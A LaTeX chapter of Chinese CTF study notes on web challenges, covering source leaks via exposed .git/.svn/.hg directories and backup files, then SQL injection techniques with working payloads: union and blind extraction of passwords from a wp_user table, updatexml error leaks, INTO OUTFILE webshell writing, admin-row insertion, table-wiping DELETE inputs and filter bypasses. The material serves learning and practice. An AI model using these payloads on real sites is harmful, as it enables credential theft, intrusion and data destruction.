\chapter{web入门}
web类题目是CTF比赛的主要题目,和二进制、逆向题目相比,不需要掌握底层知识。本章介绍web题目最常见的三类漏洞。


\section{信息收集}
信息搜集涵盖的面很广泛,包含备份文件、目录信息、Banner信息等,信息搜集主要依赖经验。


\subsection{敏感目录泄露}
通过敏感目录泄露通常可以获取网站的源代码和敏感的URL地址。
\subsubsection*{git泄露}

\paragraph*{常规git泄露}
直接用现成工具或脚本获取网站源码或flag。如:在确保目标URL含有.git的情况下,可以直接使用\href{https://github.com/denny0223/scrabble}{scrabble}来获取网站源码。命令如下:
\begin{lstlisting}
./scrabble http://example.com/
\end{lstlisting}

\paragraph*{git回滚}
利用scrabble获取网站源码后,部分情况下,flag会在之前的commit中被删除/修改,这时需要回滚。
\begin{lstlisting}
git reset --hard HEAD^ #回滚到上一版本
git log -stat #查看每个commit修改了什么
git diff HEAD commit-id #查看当前版本与目标版本的区别
\end{lstlisting}

\paragraph*{git分支}
有时候flag不在默认分支中,需要切换其他分支,但大部分现成git泄露工具不支持分支,还原其他分支代码需要手工进行文件提取。功能较强的工具有\href{https://github.com/WangYihang/GitHacker}{GitHacker},用法:
\begin{lstlisting}
python GitHacker.py [Website]
\end{lstlisting}
而后使用$git\ reflog$命令查看checkout记录,可以发现其他分支,然后修改/复用GitHacker代码来自动恢复分支。

\paragraph*{git泄露其他利用}
泄露的git中可能还有其他有用信息,比如说.git/config文件夹里面可能有access\_tocken信息,用来访问用户其他仓库。

\subsubsection*{SVN泄露}
SVN是源代码版本管理软件,管理员可能疏忽将SVN隐藏文件夹暴露在外。可以利用.svn/entries或wc.db获取服务器源码。

工具:https://github.com/kost/dvcs-ripper/,Seay-svn(windows)。


\subsubsection*{HG泄露}
HG会创建.hg隐藏文件记录代码、分支信息。

工具:https://github.com/kost/dvcs-ripper/

\subsubsection*{总结经验}

CTF线上赛往往有重定向问题,如访问.git后重定向,再访问.git/config后有内容返回,就有.git泄露问题。

目录扫描工具:https://github.com/maurosoria/dirsearch

\subsection{敏感备份文件}

\subsubsection*{gedit备份文件}
gedit:文件保存后会有一个后缀为'$\sim$'的文件。如$flag\sim$。

\subsubsection*{vim备份文件}
vim崩溃时会有一个$.swp$文件,可以用$vim\ -r$命令恢复。

\subsubsection*{常规文件}
\begin{itemize}
    \item robots.txt:CMS版本信息
    \item readme
    \item www.zip/rar/tar.gz: 常常是网站的备份源码
\end{itemize}


\subsection{Banner识别}
Banner:网站服务器对外显示的一些基础信息,如网站使用的框架等。可以据此尝试框架历史漏洞。

\subsubsection*{自行搜集指纹库}
github上有CMS指纹库,也有扫描器。

\subsubsection*{使用已有工具}
Wappalyzer工具:python工具,使用pip安装即可。

\subsubsection*{总结经验}
随意输入一些URL有时可以通过404或302跳转页面发现一些信息。


\section{SQL注入}
\subsection{SQL注入基础}
介绍数字型注入、UNION注入、字符型注入、布尔型注入、时间注入、报错注入和堆叠注入。

\subsubsection*{数字型注入和UNION注入}
数字型注入:注入点为数字。
\begin{itemize}
    \item 判断方法:注入$3-1$之类的计算式来判断是否是数字型注入。
    \item 利用方法:结合UNION语句进行联合查询注入。
\end{itemize}
联合查询时需要知道表名,mysql有自带数据库$information\_schema$,里面包含了所有的数据库名、表名、字段名:
\begin{lstlisting}
UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='NAME'
\end{lstlisting}
$ group\_concat $是将多行查询结果以逗号分隔放在一行的函数。

注意:UNION查询时,后面查询的列数要和前面查询语句查询的列数一样,所以需要用'UNION SELECT 1,2,3,...,n'的方法首先确定列数。

\subsubsection*{字符型注入和布尔盲注}
字符型注入:数字注入点外部包裹了引号。
\begin{itemize}
    \item 判断方法:输入字符'a',看查询结果和0是否一致。因为a会被强制转换为0。
    \item 利用方法:用引号闭合前面的语句,最后面用'\#'或者'-- '注释后面的部分。
    \item 注意用URL编码,'\#'为'\%23',' '为'\%20',单引号为'\%27',双引号为'\%22'。
\end{itemize}
之后操作和数字型一致。

布尔盲注:看不到查询结果时,通过在查询语句中添加判断式、观察回显页面来推测数据。
\begin{itemize}
    \item 判断方法:存在字符型注入或字符型注入但又看不到查询结果,只能通过回显页面判断结果是否存在。
    \item 利用方法:后面添加判断式,逐字符猜测结果。
    \item 常用函数:substring(str,start,len),mid(str,start,len),substr(str,start,len)。
\end{itemize}
例子:
\begin{lstlisting}
SELECT title,content FROM wp_news WHERE id='1' AND (SELECT MID((SELECT concat(user,0x7e,pwd) FROM wp_user),1,1)) = 'a'
\end{lstlisting}
'0x7e'是波浪号。

时间盲注:查询成功和查询失败的回显页面没有任何区别,这时可以通过IF或OR、AND语句,加入sleep函数,通过观察执行时间来判断。

\subsubsection*{报错注入}
报错注入:目标网站开启了错误调试信息,报错信息会回显到网页上。如:
\begin{lstlisting}
SELECT ... FROM ... WHERE ... OR VAR_DUMP(mysqli_error($\$$conn))
\end{lstlisting}
\begin{itemize}
    \item 判断方法:输入语法错误语句,看是否有报错语句回显。
    \item 利用方法:利用updatexml()第二个参数的特性,其第二个参数不是合法的XPATH路径时,会输出传入的参数。
\end{itemize}
例子:
\begin{lstlisting}
SELECT title,content FROM wp_news WHERE id='1' OR updatexml(1,concat(0x7e,(select pwd from wp_user)),1)
\end{lstlisting}

堆叠注入:目标开启了多语句执行,可以一次注入多行命令,任意修改表和数据库。

\subsection{注入点}
从SQL语法角度讲注入技巧。

\subsubsection*{SELECT注入}
\paragraph*{注入点在select\_expr}
源码形式: 
\begin{lstlisting}
SELECT $\$${_GET['id']}, content FROM wp_news
\end{lstlisting}
且页面只会显示结果中的'title','content'列。
注入方法:时间盲注或AS别名。
\begin{lstlisting}
别名: id = (SELECT pwd FROM wp_user) AS title
\end{lstlisting}

\paragraph*{注入点在table\_reference}
源码形式: 
\begin{lstlisting}
SELECT title FROM $\$${_GET['table']}
\end{lstlisting}
且页面只会显示结果中的'title','content'列。
注入方法:AS别名。
\begin{lstlisting}
别名: table = (SELECT pwd AS title FROM wp_user)
\end{lstlisting}

\paragraph*{注入点在WHERE或HAVING后}
源码形式:
\begin{lstlisting}
SELECT title FROM wp_news WHERE id=$\$${_GET['id']}
\end{lstlisting}
最常见的,和上一节的方法一样,注意判断和闭合引号和括号。

\paragraph*{注入点在GROUP\ BY或ORDER\ BY后}
源码形式:
\begin{lstlisting}
SELECT title FROM wp_news GROUP BY $\$${_GET['title']}
\end{lstlisting}
判断和注入:判断下列语句是否有效,而后时间盲注。
\begin{lstlisting}
title = id desc,(if(1,sleep(1),1))
\end{lstlisting}

\paragraph*{注入点在LIMIT后}
LIMIT后只能是数字,在语句没有ORDER\ BY关键字时,可以用UNION注入。MYSQL5.6前的版本可以用PROCEDURE注入,这个语句可以获取版本号:
\begin{lstlisting}
SELECT id FROM wp_news LIMIT 2 PROCEDURE analyse(extractvalue(1,concat(0x3a,version())),1)
\end{lstlisting}
'0x3a'是':',处理时会报错,错误回显会显示version()。
没有错误回显时,也可以基于时间注入获取版本号:
\begin{lstlisting}
PROCEDURE analyse((SELECT extractvalue(1,concat(0x3a,(IF(MID(VERSION(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1))))))),1)
# BENCHMARK处理时间大概为1s。
\end{lstlisting}
确定版本在5.6之前后,可以用INTO\ OUTFILE语句直接向web目录写入webshell。
没有写文件权限时,可以用如下语句控制部分内容:
\begin{lstlisting}
SELECT xxxx INTO outfile "/tmp/xxx.php" LINES TERMINATED BY '<?php phpinfo;?>'
\end{lstlisting}

\subsubsection*{INSERT注入}
\paragraph*{注入点位于tbl\_name}
源码形式:
\begin{lstlisting}
INSERT INTO $\$${_GET['table']} VALUES(2,2,2,2)
\end{lstlisting}
注入方法:可以注释后面语句的情况下,可以直接向任意表格插入数据。
\begin{lstlisting}
table=wp_user values(2,'new_admin','new_password')#
\end{lstlisting}

\paragraph*{注入点位于VALUES}
源码形式:
\begin{lstlisting}
INSERT INTO wp_user VALUES(1,1,'$\$${_GET['value']}')
\end{lstlisting}
注入方法:闭合单引号后另行插入一个values。
\begin{lstlisting}
value=1',values(2,1,'aaa')
value=1',values(2,1,(SELECT pwd FROM wp_user LIMIT 1)) #能回显部分字段情况下直接查询
\end{lstlisting}

\subsubsection*{UPDATE注入}
源码形式:
\begin{lstlisting}
UPDATE wp_user SET id=$\$${_GET['id']} WHERE user='x'
\end{lstlisting}
注入方法:可以修改多字段,或使用与SELECT语句类似的方法。
\begin{lstlisting}
id=1,user='y'
\end{lstlisting}

\subsubsection*{DELETE注入}
源码形式:
\begin{lstlisting}
DELETE FROM wp_news WHERE id=$\$${_GET['id']}
\end{lstlisting}
注入方法:可以直接删除整个表,也可以通过sleep防止表被删后进行时间盲注:
\begin{lstlisting}
id=1 or 1   #删除所有
id=1 and sleep(1)   #sleep会返回0
\end{lstlisting}


\subsection{注入和防御}

\subsubsection*{字符替换}
防御方法:直接替换关键字。

\paragraph*{只替换空格}
防御者直接替换空格为空。
攻击方法:用"\%0a,\%0b,\%0c,\%09,\%a0"和/**/组合、括号等替代空格。

\paragraph*{将SELECT替换为空}
防御者直接替换SELECT为空。
攻击方法:嵌套,使用SESELECTLECT。

\paragraph*{大小写匹配}
防御者替换select或SELECT。
攻击方法:使用sElEcT。

\paragraph*{正则匹配}
匹配语句:"$\backslash$bselect$\backslash$b"。
攻击方法:可以用"/*!5000select*/"绕过。

\paragraph*{过滤引号,但没过滤反斜杠}
源码形式:
\begin{lstlisting}
SELECT * FROM wp_news WHERE id='可控点1' AND title='可控点2'
\end{lstlisting}
攻击方法:使用反斜杠转义可控点1后面的单引号,使可控点2逃逸。
\begin{lstlisting}
可控点1:a\
可控点2:or sleep(1) #
\end{lstlisting}

\subsubsection*{逃逸引号}
开发者常常对用户输入做addslashes,添加反斜杠转义引号等。

\paragraph*{编码解码}
若开发者使用了urldecode、base64\_decode等解码函数,则将引号编码后输入。

\paragraph*{意料之外的输入点}
PHP中上传的文件名、http\ header、$\$$\_SERVER['PHP\_SELF']。

\paragraph*{二次注入}
开发者通常信任数据库中取出的数据。
攻击者可以设置用户名为admin'or'1,用户名在转义后可以顺利存入数据库。当用户名被再次使用时:
\begin{lstlisting}
SELECT password from wp_user WHERE username='admin'or'1'
\end{lstlisting}

\paragraph*{字符串阶段}
开发者可能限定长度。
源码形式:
\begin{lstlisting}
SELECT * FROM wp_news WHERE id='可控点1' AND title='可控点2'
\end{lstlisting}
其中限制了可控点1的长度为10且添加了addslashes转义可控点1中的反斜杠、引号。
攻击方法:
\begin{lstlisting}
可控点1=aaaaaaaaa'
\end{lstlisting}
这时可控点1会被转义为aaaaaaaaa$\backslash$',正好'被截断,最后一位是$\backslash$,从而使可控点2逃逸。

\subsection{注入的功效}
\begin{itemize}
    \item 文件读写。INTO\ OUTFILE、DUMPFILE、load\_file()。
    \item 提权。添加权限、添加用户。
    \item 文件读取。
    \item 数据库控制。
    \item SQL\ SERVER中系统命令执行。
\end{itemize}

\section{任意文件读取}